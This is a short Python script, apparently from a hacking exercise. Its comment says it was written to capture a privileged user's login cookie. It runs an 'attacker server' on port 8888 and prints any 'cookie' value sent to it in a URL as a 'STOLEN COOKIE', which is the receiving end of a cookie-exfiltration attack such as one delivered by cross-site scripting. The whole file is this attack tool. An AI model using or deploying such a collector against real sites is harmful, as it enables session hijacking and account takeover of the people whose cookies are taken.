# I wrote this script in order to listen to the logins and take the cookie of the strong user!

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Parse the URL that arrived
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        # If the URL contains a "cookie" parameter - print it
        if 'cookie' in params:
            print(f"STOLEN COOKIE: {params['cookie'][0]}")

        # Send back 200 OK
        self.send_response(200)
        self.end_headers()


server = HTTPServer(('0.0.0.0', 8888), Handler)
print("Attacker server running on port 8888...")
server.serve_forever()